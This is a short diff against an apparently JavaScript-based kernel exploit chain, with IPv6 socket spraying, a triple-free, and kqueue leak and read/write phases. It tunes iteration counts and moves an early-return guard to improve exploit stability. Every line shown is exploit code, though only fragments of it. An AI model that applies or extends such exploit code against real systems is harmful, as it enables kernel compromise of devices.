@@ -118,7 +118,7 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 15;
+var TRIPLEFREE_ITERATIONS = 20;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1074,9 +1074,10 @@ function exploit_phase_leak() {
 }
 
 function exploit_phase_rw() {
+
+  if (exploit_end) return;
   log(' Exploit Read/Write...');
   log('Stability by M.ELHOUT');
-  if (exploit_end) return;
 
   var ok = true;
   try {
@@ -1633,7 +1634,7 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
 
   var count = 0;
-  var MAX_KQ = 2000; 
+  var MAX_KQ = 1000; 
 
   while (count < MAX_KQ) {
     count++;
